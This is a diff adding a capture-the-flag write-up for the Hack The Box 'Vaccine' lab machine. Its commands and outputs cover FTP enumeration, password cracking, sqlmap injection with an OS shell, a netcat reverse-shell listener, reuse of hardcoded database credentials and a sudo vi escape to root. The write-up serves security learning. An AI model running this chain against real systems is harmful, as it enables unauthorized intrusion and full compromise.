@@ -1,0 +1,550 @@
+# HTB Vaccine Writeup
+
+## Overview
+
+**Machine:** Vaccine
+**Difficulty:** Easy
+**Operating System:** Linux
+**Skills Learned:**
+
+* FTP Enumeration
+* Password Cracking with John the Ripper
+* Source Code Review
+* MD5 Hash Cracking
+* SQL Injection Discovery
+* SQLMap Enumeration
+* OS Command Execution
+* Reverse Shell Stabilization
+* Credential Harvesting
+* SSH Access
+* Linux Privilege Escalation
+* Sudo Misconfigurations
+* Vi Privilege Escalation
+
+---
+
+# Attack Path
+
+```text
+Nmap
+ └─ Anonymous FTP
+     └─ backup.zip
+         └─ ZIP Password Cracked
+             └─ Source Code Disclosure
+                 └─ Admin Credentials Recovered
+                     └─ Dashboard Access
+                         └─ SQL Injection
+                             └─ SQLMap OS Shell
+                                 └─ Reverse Shell
+                                     └─ PostgreSQL Credentials
+                                         └─ SSH Access
+                                             └─ Sudo Misconfiguration
+                                                 └─ Root
+```
+
+---
+
+# Enumeration
+
+## Nmap Scan
+
+```bash
+nmap -sC -sV 10.129.95.174
+```
+
+### Results
+
+| Port | Service | Version       |
+| ---- | ------- | ------------- |
+| 21   | FTP     | vsftpd 3.0.3  |
+| 22   | SSH     | OpenSSH 8.0   |
+| 80   | HTTP    | Apache 2.4.41 |
+
+Most interesting finding:
+
+```text
+Anonymous FTP login allowed
+backup.zip
+```
+
+Anonymous FTP access often exposes backups, configuration files, or sensitive data.
+
+---
+
+# FTP Enumeration
+
+Connect to FTP:
+
+```bash
+ftp 10.129.95.174
+```
+
+Login using:
+
+```text
+Username: anonymous
+Password: anonymous
+```
+
+List files:
+
+```bash
+ls
+```
+
+Output:
+
+```text
+backup.zip
+```
+
+Download:
+
+```bash
+get backup.zip
+```
+
+---
+
+# Cracking backup.zip
+
+Attempting extraction immediately reveals that the archive is password protected.
+
+```bash
+unzip backup.zip
+```
+
+Instead of guessing, extract the ZIP hash:
+
+```bash
+zip2john backup.zip > hashes
+```
+
+Crack using RockYou:
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes
+```
+
+Result:
+
+```text
+741852963
+```
+
+Extract the archive:
+
+```bash
+unzip backup.zip
+```
+
+---
+
+# Source Code Review
+
+The archive contains:
+
+```text
+index.php
+style.css
+```
+
+Reviewing the PHP code reveals the authentication mechanism:
+
+```php
+if($_POST['username'] === 'admin' &&
+md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3")
+```
+
+Interesting findings:
+
+* Valid username: `admin`
+* Password stored as MD5 hash
+
+---
+
+# Cracking the Admin Password
+
+Save the hash:
+
+```bash
+echo '2cb42f8734ea607eefed3b70af13bbd3' > adminhash.txt
+```
+
+Crack it:
+
+```bash
+john --format=Raw-MD5 \
+--wordlist=/usr/share/wordlists/rockyou.txt \
+adminhash.txt
+```
+
+Result:
+
+```text
+qwerty789
+```
+
+### Credentials
+
+```text
+admin : qwerty789
+```
+
+---
+
+# Web Application Access
+
+Login to:
+
+```text
+http://10.129.95.174
+```
+
+Using:
+
+```text
+admin
+qwerty789
+```
+
+After authentication we gain access to the dashboard.
+
+The dashboard contains a search function:
+
+```text
+dashboard.php?search=diesel
+```
+
+Search parameters are common SQL Injection targets.
+
+---
+
+# SQL Injection Discovery
+
+Capture the authenticated session cookie:
+
+```text
+PHPSESSID=...
+```
+
+Launch SQLMap:
+
+```bash
+sqlmap -u \
+"http://10.129.95.174/dashboard.php?search=test" \
+--cookie="PHPSESSID=..."
+```
+
+SQLMap confirms:
+
+```text
+Back-end DBMS: PostgreSQL
+```
+
+The search parameter is vulnerable to SQL Injection.
+
+---
+
+# SQLMap Enumeration
+
+Useful options:
+
+| Option     | Purpose                     |
+| ---------- | --------------------------- |
+| --dbs      | List databases              |
+| --tables   | List tables                 |
+| --columns  | List columns                |
+| --dump     | Dump table contents         |
+| --dump-all | Dump everything             |
+| --all      | Full enumeration            |
+| --os-shell | Obtain OS command execution |
+
+Examples:
+
+```bash
+--dbs
+```
+
+```bash
+--tables
+```
+
+```bash
+--columns
+```
+
+```bash
+--dump
+```
+
+After enumeration, no immediately useful credentials or flags were found.
+
+Time to move beyond the database.
+
+---
+
+# Obtaining an OS Shell
+
+Use SQLMap's OS shell feature:
+
+```bash
+sqlmap ... --os-shell
+```
+
+This provides operating system command execution through the SQL Injection vulnerability.
+
+The shell is functional but unstable.
+
+---
+
+# Upgrading the Shell
+
+Start a listener:
+
+```bash
+nc -lvnp 1234
+```
+
+Identify VPN address:
+
+```bash
+ip a | grep tun0
+```
+
+Example:
+
+```text
+10.10.14.49
+```
+
+Obtain a reverse shell connection.
+
+Once connected, spawn a pseudo-terminal:
+
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+### Why?
+
+A PTY provides:
+
+* Better interaction
+* Improved command handling
+* Interactive programs support
+* More reliable shell behavior
+
+---
+
+# User Flag
+
+Explore PostgreSQL's directory:
+
+```bash
+ls /var/lib/postgresql
+```
+
+Output:
+
+```text
+11
+user.txt
+```
+
+Read the flag:
+
+```bash
+cat /var/lib/postgresql/user.txt
+```
+
+User flag obtained.
+
+---
+
+# Credential Hunting
+
+Continue enumerating the web application files.
+
+Navigate to:
+
+```bash
+cd /var/www/html
+```
+
+Read the dashboard source:
+
+```bash
+cat dashboard.php
+```
+
+Interesting discovery:
+
+```php
+$conn = pg_connect(
+"host=localhost
+port=5432
+dbname=carsdb
+user=postgres
+password=P@s5w0rd!"
+);
+```
+
+### Why is this important?
+
+Developers frequently hardcode credentials inside source code.
+
+These credentials can often be reused elsewhere on the system.
+
+Recovered credentials:
+
+```text
+postgres : P@s5w0rd!
+```
+
+---
+
+# SSH Access
+
+Since the SQLMap shell disconnects frequently, SSH provides a much more stable foothold.
+
+Connect:
+
+```bash
+ssh postgres@10.129.95.174
+```
+
+Password:
+
+```text
+P@s5w0rd!
+```
+
+---
+
+# Privilege Escalation Enumeration
+
+Always check sudo permissions:
+
+```bash
+sudo -l
+```
+
+Output:
+
+```text
+User postgres may run the following commands:
+
+(ALL)
+/bin/vi /etc/postgresql/11/main/pg_hba.conf
+```
+
+This is a high-value finding.
+
+---
+
+# Understanding Vi
+
+Vi (or Vim) is a terminal-based text editor commonly installed on Linux systems.
+
+Although designed for editing files, it also contains functionality that can interact with the operating system.
+
+When a user can launch Vi with elevated privileges, it can sometimes be leveraged to execute commands with those privileges.
+
+---
+
+# Privilege Escalation
+
+Launch the allowed command:
+
+```bash
+sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+```
+
+Inside Vi:
+
+```vim
+:set shell=/bin/sh
+```
+
+Then:
+
+```vim
+:shell
+```
+
+Verify access:
+
+```bash
+whoami
+```
+
+Output:
+
+```text
+root
+```
+
+Root access obtained.
+
+---
+
+# Root Flag
+
+Navigate to root's home directory:
+
+```bash
+cd /root
+```
+
+Read:
+
+```bash
+cat root.txt
+```
+
+Root flag obtained.
+
+---
+
+# Lessons Learned
+
+This machine was an excellent introduction to chaining multiple vulnerabilities together.
+
+Key takeaways:
+
+* Always investigate anonymous FTP access.
+* Backup files often contain sensitive information.
+* Source code review can reveal credentials and authentication logic.
+* MD5 hashes are weak and commonly crackable.
+* SQL Injection is often only the beginning of an attack path.
+* Application source code frequently contains reusable credentials.
+* Stable access is often more valuable than a temporary shell.
+* Always run `sudo -l`.
+* Misconfigured sudo permissions are one of the most common privilege escalation vectors.
+
+---
+
+# Tools Used
+
+* Nmap
+* FTP
+* John the Ripper
+* zip2john
+* SQLMap
+* Netcat
+* SSH
+* Vi/Vim
+
+---
+
+# Final Thoughts
+
+Vaccine is one of my favorite Starting Point machines because it demonstrates how seemingly small findings can be chained together into full system compromise.
+
+A simple anonymous FTP login led to source code disclosure, which led to credential recovery, SQL Injection, command execution, credential reuse, SSH access, and finally privilege escalation to root.
+
+This machine reinforces an important lesson:
+
+> Enumeration wins boxes.
+
